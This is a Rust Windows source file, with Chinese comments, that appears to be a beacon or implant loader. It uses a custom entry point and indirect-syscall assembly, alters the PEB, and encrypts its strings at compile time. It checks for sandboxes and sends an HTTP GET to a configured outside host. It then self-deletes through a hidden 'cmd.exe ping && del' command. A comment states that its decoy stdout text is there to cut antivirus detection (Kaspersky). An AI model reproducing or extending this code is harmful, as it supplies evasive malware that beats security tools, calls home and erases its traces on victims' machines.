#![no_std]
#![no_main]
#![allow(unsafe_op_in_unsafe_fn)]

extern crate alloc;
extern crate panic_halt;

use spin::Once;

mod common;
// mod premain;
mod winapi;

// #[cfg(feature = "ntdll")]
// mod helper;


#[cfg(feature = "ntdll")]
mod native;

#[cfg(feature = "ntdll")]
mod instance;

// #[cfg(feature = "ntdll")]
// mod k32;

// #[cfg(feature = "ntdll")]
// use k32::init_kernel32_funcs;

#[cfg(feature = "ntdll")]
use instance::get_instance;

mod debug;
use crate::debug::Writer;
use core::fmt::{self, Write};

include!("../config.rs");

use windows_sys::Win32::{
    System::Memory::{VirtualAlloc, VirtualFree, MEM_COMMIT, PAGE_READWRITE, MEM_RELEASE, VirtualProtect, PAGE_READONLY},
    Networking::WinHttp::{WinHttpOpen, WinHttpConnect, WinHttpOpenRequest, WinHttpSendRequest, WinHttpCloseHandle, INTERNET_DEFAULT_HTTP_PORT, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_FLAG_BYPASS_PROXY_CACHE},
    System::Threading::{CreateProcessW, ExitProcess, STARTUPINFOW, PROCESS_INFORMATION, INFINITE, STARTF_USESHOWWINDOW, CREATE_NO_WINDOW},
    System::LibraryLoader::GetModuleFileNameW,
    Foundation::CloseHandle,
    UI::WindowsAndMessaging::SW_HIDE,
};
use core::ffi::c_void;
use core::ptr::{null, null_mut, copy_nonoverlapping};
use windows_sys::Win32::UI::WindowsAndMessaging::{MessageBoxW, MB_OK};

use common::structs::Utf16;

use common::structs::unsafety::Utf16String;

use core::{arch::global_asm};

#[cfg(feature = "ntdll")]
use {
    native::{
        ntapi::init_ntdll_funcs, 
        ntdef::find_peb,
    },
    instance::Instance,
};

#[cfg(feature = "noheap")]
use common::structs::noheap::Utf16StaticString;

#[unsafe(no_mangle)]
pub extern "C" fn initialize() {
    unsafe {
        // Stack allocation of Instance
        // [2025/6/27] Rust作用域问题差点坑死我，instance放到下面那个代码块中导致没到main()就被释放了，小心！
        #[cfg(feature = "ntdll")]
        let mut instance = Instance::new();

        #[cfg(feature = "ntdll")]
        {
            debug_println!("start with ntdll\n");

            // Append instance address to PEB.ProcessHeaps
            let instance_ptr: *mut c_void = &mut instance as *mut _ as *mut c_void;

            let peb = find_peb();
            let process_heaps = (*peb).process_heaps as *mut *mut c_void;
            let number_of_heaps = (*peb).number_of_heaps as usize;

            // Increase the NumberOfHeaps
            (*peb).number_of_heaps += 1;

            // Append the instance_ptr
            *process_heaps.add(number_of_heaps) = instance_ptr;
        }

        // Proceed to main function
        main();
    }
}

unsafe fn main() {
    debug_println!("start ntdll init\n");

    #[cfg(feature = "ntdll")]
    init_ntdll_funcs();

    debug_println!("ntdll init complete\n");

    // #[cfg(feature = "ntdll")]
    // init_kernel32_funcs();

    // debug_println!("kernel32 init complete\n");

    #[cfg(feature = "antisandbox")]
    if crate::winapi::antisand::check_environment() {
        debug_println!("Found Sandbox!");
        #[cfg(all(feature = "selfdelete", feature = "noheap"))]
        let success = self_delete::<Utf16StaticString>();

        #[cfg(all(not(feature = "noheap"), feature = "selfdelete"))]
        let success = self_delete::<Utf16String>();
        return;
    }else {
        debug_println!("checked and not found sandbox");
    }

    #[cfg(feature = "noheap")]
    send_message::<Utf16StaticString>();

    #[cfg(not(feature = "noheap"))]
    send_message::<Utf16String>();
}

#[cfg(target_arch = "x86_64")]
global_asm!(
    r#"
.globl _start
.globl isyscall

.section .text

_start:
    push  rsi
    nop
    mov   rsi, rsp
    and   rsp, 0xFFFFFFFFFFFFFFF0
    sub   rsp, 0x20
    call  initialize
    mov   rsp, rsi
    pop   rsi
    ret

isyscall:
    mov [rsp - 0x8],  rsi
    mov [rsp - 0x10], rdi
    mov [rsp - 0x18], r12

    sub   r10, r10
    mov   eax, ecx
    mov   r10, rax

    mov   r12, rdx
    mov   rcx, r8

    mov   r10, r9
    mov   rdx,  [rsp + 0x28]
    mov   r8,   [rsp + 0x30]
    mov   r9,   [rsp + 0x38]

    sub   rcx, 0x4
    jle   skip

    lea   rsi,  [rsp + 0x40]
    lea   rdi,  [rsp + 0x28]

    nop
    rep movsq
skip:
    mov   rcx, r12

    mov   rsi, [rsp - 0x8]
    mov   rdi, [rsp - 0x10]
    mov   r12, [rsp - 0x18]

    jmp   rcx
"#
);

/// x86内联汇编莫名其妙的有问题，已知报错找不到initialize
/// 暂时没搞懂问题出在哪了
#[cfg(target_arch = "x86")]
global_asm!(
    r#"
.globl _start
.globl isyscall

.section .text

_start:
    push  esi
    nop
    mov   esi, esp
    and   esp, 0xFFFFFFF0
    sub   esp, 0x20
    call  initialize
    mov   esp, esi
    pop   esi
    ret

isyscall:
    mov [esp - 0x4], esi
    mov [esp - 0x8], edi
    mov [esp - 0xC], ebx 

    xor   edx, edx
    mov   eax, ecx
    mov   edx, eax 

    mov   ebx, edx 
    mov   ecx, [esp + 0x10]
    mov   edx, [esp + 0x14]

    mov   eax, [esp + 0x18]
    mov   esi, [esp + 0x1C]
    mov   edi, [esp + 0x20]

    sub   ecx, 0x4
    jle   skip

    lea   esi, [esp + 0x24]
    lea   edi, [esp + 0x10]
    nop
    rep movsd
skip:
    mov   ebx, [esp - 0xC]
    mov   edi, [esp - 0x8]
    mov   esi, [esp - 0x4]

    jmp   ebx
"#
);




#[cfg(not(feature = "ntdll"))]
use crate::winapi::allocator::Win32HeapAllocator;

#[cfg(not(feature = "ntdll"))]
#[global_allocator]
pub static ALLOCATOR: Win32HeapAllocator = Win32HeapAllocator;

#[cfg(feature = "ntdll")]
use crate::native::allocator::NtVirtualAlloc;

#[cfg(feature = "ntdll")]
#[global_allocator]
static GLOBAL: NtVirtualAlloc = NtVirtualAlloc;

use macro_encrypt::encrypt;

use alloc::alloc::{alloc, dealloc, Layout};

// 定义对齐的结构体
#[repr(C, align(4))]  // 4字节对齐
struct AlignedPayload([u16; 16]);

#[unsafe(link_section = ".rdata")]
static PAYLOAD: AlignedPayload = AlignedPayload([0x0058; 16]); // UTF-16编码的初始填充


/// 最多支持的路径长度（含null终止）
const MAX_PATH_LEN: usize = 260;

unsafe fn get_current_exe_path(buf: &mut [u16; MAX_PATH_LEN]) -> usize {
    let len = GetModuleFileNameW(0 as *mut c_void, buf.as_mut_ptr(), MAX_PATH_LEN as u32);
    len as usize
}


pub unsafe fn send_message<T: Utf16>() {
    init_ip_or_domain();

    // Enable SeDebugPrivilege.
    // #[cfg(feature = "ntdll")]
    // if initialize_privileges() != 0 {
    //     return;
    // }

    unsafe {
        let ptr = &PAYLOAD as *const _ as *mut core::ffi::c_void;
        let mut old = 0;
        VirtualProtect(ptr, core::mem::size_of_val(&PAYLOAD), PAGE_READONLY, &mut old);
    };

    let method = T::new(&encrypt!("GET"));
    let entry_id = core::ptr::addr_of!(PAYLOAD.0) as *const u16;

    unsafe{

        let h_session = WinHttpOpen(
            null(), 
            WINHTTP_ACCESS_TYPE_NO_PROXY, 
            null(), 
            null(), 
            0
        );
        if h_session.is_null() {
            return ;
        }
        
        let h_connect = WinHttpConnect(
            h_session,
            get_ip_or_domain().as_ptr(), //ip or domain
            PORT, // port
            0
        );
        
        let h_request = WinHttpOpenRequest(
            h_connect,
            method.as_ptr(), //get or post
            entry_id,  // 路径
            null(),  
            null(),  
            null(),
            WINHTTP_FLAG_BYPASS_PROXY_CACHE
        );
        
        let result = WinHttpSendRequest(
            h_request,
            core::ptr::null(),
            0,
            core::ptr::null(),
            0,
            0,
            0
        );
        
        let text = T::new(&encrypt!("运行成功"));
        let caption = T::new(&encrypt!("已完成"));
        MessageBoxW(
            core::ptr::null_mut(),
            text.as_ptr(),
            caption.as_ptr(),
            MB_OK,
        );

        WinHttpCloseHandle(h_request);
        WinHttpCloseHandle(h_connect);
        WinHttpCloseHandle(h_session);

        #[cfg(feature = "selfdelete")]
        let success = self_delete::<T>();

        ExitProcess(0);
    }
}

#[cfg(feature = "selfdelete")]
pub unsafe fn self_delete<T: Utf16>() -> i32 {
    /// `cmd.exe /C del /F /Q "C:\path\to\self.exe" >nul 2>&1`
    unsafe fn build_cmdline<T: Utf16>(exe_path: &[u16]) -> T {
        let prefix = encrypt!(r#"cmd.exe /C ping -n 4 127.0.0.1 >nul && del /F /Q ""#);
        let suffix = encrypt!(r#"" >nul 2>&1"#);
        let exe_path = common::utils::strip_utf16_null(exe_path);

        T::join_str_utf16_str(&prefix, exe_path, &suffix)
    }
    //self kill
    //隐藏窗口：需要设置 dwCreationFlags 参数为 CREATE_NO_WINDOW，并确保 STARTUPINFOW 结构体的 dwFlags 含有 STARTF_USESHOWWINDOW，且 wShowWindow 被设置为 SW_HIDE。
    let mut exe_buf = [0u16; MAX_PATH_LEN];
    let len = get_current_exe_path(&mut exe_buf);

    let cmdline = build_cmdline::<T>(&exe_buf[..len]);

    let mut si: STARTUPINFOW = core::mem::zeroed();
    si.cb = core::mem::size_of::<STARTUPINFOW>() as u32;
    si.dwFlags = windows_sys::Win32::System::Threading::STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE as u16;

    let mut pi: PROCESS_INFORMATION = core::mem::zeroed();

    let success = CreateProcessW(
        null_mut(),                         // lpApplicationName
        cmdline.as_ptr() as *mut u16,       // lpCommandLine
        null_mut(),                         // lpProcessAttributes
        null_mut(),                         // lpThreadAttributes
        0,                                   // bInheritHandles
        CREATE_NO_WINDOW,                                   // dwCreationFlags
        null_mut(),                         // lpEnvironment
        null_mut(),                         // lpCurrentDirectory
        &si as *const _ as *mut _,          // lpStartupInfo
        &mut pi as *mut _                   // lpProcessInformation
    );

    if success != 0 {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    success

}

unsafe extern "C" {
    pub fn _start();
}


/// stdout 和 stderr 输出无意义字符 降低误报率 卡巴喜欢这个
#[cfg(not(feature = "debug"))]
#[macro_export]
macro_rules! debug_println {
    ($($arg:tt)*) => {

        let STD_OUTPUT_HANDLE: usize = -11i32 as usize;
        let STD_ERROR_HANDLE: usize  = -12i32 as usize;

        let mut out = Writer {
            handle: STD_OUTPUT_HANDLE as *mut core::ffi::c_void,
        };
        let mut err = Writer {
            handle: STD_ERROR_HANDLE as *mut core::ffi::c_void,
        };

        let _ = writeln!(out, "This is a Test");
        let _ = writeln!(err, "Please check out");
    };
}
